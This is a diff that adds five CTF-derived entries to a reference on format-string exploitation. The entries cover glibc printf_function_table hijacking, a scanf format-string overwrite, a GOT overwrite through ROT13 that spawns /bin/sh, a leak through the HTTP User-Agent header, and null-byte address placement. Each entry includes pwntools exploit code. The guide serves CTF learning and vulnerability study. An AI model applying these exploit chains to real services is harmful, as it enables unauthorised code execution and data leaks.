@@ -10,12 +10,17 @@
 - [.rela.plt / .dynsym Patching](#relaplt--dynsym-patching)
 - [Format String for Game State Manipulation (UTCTF 2026)](#format-string-for-game-state-manipulation-utctf-2026)
 - [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
-- [argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
+- [argv\[0\] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
 - [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
 - [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
 - [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
 - [Objective-C %@ Format Specifier Exploitation (SHA2017)](#objective-c--format-specifier-exploitation-sha2017)
 - [strlen Integer Truncation Bypass (ASIS CTF Finals 2017)](#strlen-integer-truncation-bypass-asis-ctf-finals-2017)
+- [printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)](#printf_function_table-overwrite-via-buffer-overflow-34c3-ctf-2017)
+- [scanf Format String on Stack Overwrite (TUCTF 2017)](#scanf-format-string-on-stack-overwrite-tuctf-2017)
+- [Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)](#format-string-exploit-through-rot13-encoding-sunshinectf-2018)
+- [Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)](#format-string-in-http-user-agent-for-pie-leak-x-mas-ctf-2018)
+- [Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)](#null-byte-address-fragmentation-in-small-buffers-fireshell-2019)
 
 ---
 
@@ -516,3 +521,175 @@ payload = filler + exploit_suffix
 **Key insight:** `strlen()` cast to `int8_t` produces signed overflow at length 255, collapsing the sanitization window to zero. Any payload content placed at or beyond byte 255 escapes the filter. Always check for integer truncation when a length field is stored in a signed or short type.
 
 **References:** ASIS CTF Finals 2017
+
+---
+
+## printf_function_table Overwrite via Buffer Overflow (34C3 CTF 2017)
+
+**Pattern:** Exploit glibc's internal printf dispatch tables to turn a buffer overflow into an information leak without needing a format string vulnerability. When `printf_function_table` is non-NULL, glibc dispatches format specifiers through `printf_arginfo_table` instead of the default handlers.
+
+**Mechanism:**
+1. Buffer overflow to create a fake `printf_arginfo_size_function` structure pointing to `_fortify_fail`
+2. Overwrite `__libc_argv` so `_fortify_fail` prints the flag instead of the real `argv[0]`
+3. Set `printf_function_table` to a non-NULL value (triggers alternate dispatch)
+4. Set `printf_arginfo_table` to point to the fake structure
+
+**How the dispatch works:**
+```c
+// Inside glibc's printf implementation:
+if (__printf_function_table != NULL) {
+    // Alternate path: look up handler via printf_arginfo_table
+    int spec_index = format_char;  // e.g., 'd' = 100
+    // Calls printf_arginfo_table[spec_index](...)
+    // → redirected to _fortify_fail
+}
+
+// _fortify_fail prints:
+//   "*** buffer overflow detected ***: %s terminated\n", __libc_argv[0]
+// If __libc_argv[0] points to the flag → flag is leaked
+```
+
+**Exploitation:**
+```python
+from pwn import *
+
+# Addresses determined from libc
+printf_function_table = libc_base + PRINTF_FUNCTION_TABLE_OFF
+printf_arginfo_table = libc_base + PRINTF_ARGINFO_TABLE_OFF
+libc_argv = libc_base + LIBC_ARGV_OFF
+fortify_fail = libc_base + FORTIFY_FAIL_OFF
+
+# Step 1: Overflow to overwrite __libc_argv to point to flag location
+# Step 2: Create fake arginfo table entry pointing to _fortify_fail
+# Step 3: Set printf_function_table to non-NULL
+# Step 4: Set printf_arginfo_table to fake table
+
+# Any subsequent printf with a format specifier (e.g., %d, %s)
+# triggers: printf_arginfo_table['d'] → _fortify_fail
+# _fortify_fail reads __libc_argv[0] → prints flag contents
+```
+
+**Key insight:** When `printf_function_table` is non-NULL, glibc dispatches format specifiers through `printf_arginfo_table`. Overwriting both lets you redirect any printf format specifier to an arbitrary function. Combined with `_fortify_fail` (which prints `__libc_argv[0]`), this turns a buffer overflow into an info leak without needing a format string vulnerability.
+
+**When to recognize:** Buffer overflow that can reach glibc globals but no direct format string vulnerability. The target binary calls `printf` with format specifiers after the overflow. Useful when the goal is information exfiltration (flag leak) rather than code execution.
+
+**References:** 34C3 CTF 2017
+
+---
+
+## scanf Format String on Stack Overwrite (TUCTF 2017)
+
+**Pattern:** When `scanf`'s format string (e.g., `"%30s"`) is stored on the stack adjacent to the user input buffer rather than in `.rodata`, the first input can overflow into the format specifier itself, expanding the allowed read size for the next call.
+
+**Two-stage overflow:**
+```python
+from pwn import *
+
+# Stage 1: Overflow the scanf format string on the stack
+# Format "%30s" is stored 0x14 bytes after the input buffer
+# Overwrite it to become "%99s"
+payload0 = b"0" * 0x14 + p32(0x73393925)  # 0x73393925 = "%99s" in little-endian
+io.sendline(payload0)
+
+# Stage 2: scanf now reads up to 99 bytes instead of 30
+# Use the expanded buffer to reach and overwrite the return address
+payload1 = b"0" * 0x31 + p32(win_addr)     # 0x31 bytes padding + return address
+io.sendline(payload1)
+```
+
+**Stack layout:**
+```text
++0x00: input_buffer[30]    ← scanf reads here
++0x14: format_string[4]    ← "%30s" (overwritten to "%99s")
+  ...
++0x31: saved_ebp
++0x35: return_address       ← target for stage 2
+```
+
+**Key insight:** If the format specifier for `scanf` is on the stack (not in `.rodata`), the first input can overwrite it to expand the read size, then the second input uses the expanded format to reach the return address. Two-stage overflow: first expand the format string, then exploit the expanded buffer. Check whether format strings are stack-allocated by examining the disassembly — `lea` from `rbp`/`rsp` offset (stack) vs. `lea` from `rip`-relative address (`.rodata`).
+
+**When to recognize:** Binary uses `scanf` with a format string that limits input length (e.g., `%30s`), but the overflow is just short of reaching the return address. If the format string is a local variable on the stack rather than a string literal, this two-stage technique bridges the gap.
+
+**References:** TUCTF 2017
+
+---
+
+## Format String Exploit Through ROT13 Encoding (SunshineCTF 2018)
+
+**Pattern:** A "ROT13 encryption service" applies ROT13 to user input before passing it to `printf`. Leak addresses and build format string payloads, but ROT13-encode them first so they survive the transformation and reach `printf` intact.
+
+**Attack chain:**
+1. Input is ROT13-encoded by the binary before reaching `printf`
+2. ROT13 is self-inverse: `rot13(rot13(x)) = x`
+3. Pre-encode format string payloads with ROT13 so the transformation produces the intended format specifiers
+4. Leak libc and program addresses via ROT13-encoded `%p` specifiers
+5. Build a `fmtstr_payload` to overwrite `strlen@GOT` with `system`, then send `/bin/sh`
+
+```python
+import codecs
+from pwn import *
+
+def rot13(s):
+    return codecs.encode(s, 'rot_13')
+
+io = remote('target', 1337)
+
+# Stage 1: Leak addresses through ROT13 transform
+# rot13('%2$x|%3$x') produces encoded string; after binary's rot13, printf sees '%2$x|%3$x'
+io.sendline(rot13('%2$x|%3$x').encode())
+leak = io.recvline().decode()
+libc_leak, prog_leak = leak.split('|')
+libc_base = int(libc_leak, 16) - known_offset
+prog_base = int(prog_leak, 16) - known_offset
+
+# Stage 2: Overwrite strlen@GOT with system via format string
+strlen_got = prog_base + elf.got['strlen']
+system_addr = libc_base + libc.symbols['system']
+writes = {strlen_got: system_addr}
+payload = fmtstr_payload(7, writes)
+
+# ROT13-encode the entire payload so binary's rot13 produces the real fmt string
+encoded_payload = rot13(payload.decode('latin-1')).encode('latin-1')
+io.sendline(encoded_payload)
+
+# Stage 3: Send /bin/sh -- strlen("/bin/sh") now calls system("/bin/sh")
+io.sendline(b'/bin/sh')
+io.interactive()
+```
+
+**Key insight:** When input is transformed before reaching printf (ROT13, Caesar, etc.), pre-encode the format string payload with the inverse transform. ROT13 is self-inverse, so `rot13(rot13(payload)) = payload` reaches printf intact. This applies to any invertible transformation applied before a format string sink -- XOR, base64, substitution ciphers, etc.
+
+**References:** SunshineCTF 2018
+
+---
+
+## Format String in HTTP User-Agent for PIE Leak (X-MAS CTF 2018)
+
+**Pattern:** A PIE-compiled HTTP server logs the `User-Agent` header with `printf(ua)`. No other info-leak primitives exist, but the stack canary and PIE base both sit near the logging frame. One request leaks both in a single response.
+
+```python
+# Leak canary at offset 6, PIE base at offset 7
+r = requests.get('http://target/', headers={'User-Agent': '%6$p.%7$p'})
+canary, pie = [int(x, 16) for x in r.text.strip().split('.')]
+pie_base = pie - elf.sym['main']
+```
+
+**Key insight:** Any header parsed into a format-string sink turns a remote HTTP server into a leak oracle. Check logs, error messages, and reflected headers before assuming you need a binary-local primitive.
+
+**References:** X-MAS CTF 2018 — I want that toy, writeup 12672
+
+---
+
+## Null-Byte Address Fragmentation in Small Buffers (FireShell 2019)
+
+**Pattern:** The vulnerable buffer is 16 bytes, so a typical `fmtstr_payload(offset=..., writes={addr: val})` fails because `printf` stops at the first null byte in `addr`. Work around it by placing the format specifier *first* and the target address *last* in the buffer — printf consumes the format bytes before it hits the null.
+
+```python
+fmtstr = b"%9x%11$n" + b"\x20\x20\x60\x00\x00\x00\x00\x00"
+# printf processes %9x%11$n using the address at offset 11 (the trailing 8 bytes)
+# Writes 0x9 (from %9x count) to *0x602020
+```
+
+**Key insight:** Format-string null-byte restrictions only bite when the address precedes the format directives. Put the directives first so `printf` parses them before touching the address, then let `%$n` reference the trailing address slot.
+
+**References:** FireShell CTF 2019 — casino, writeup 12916
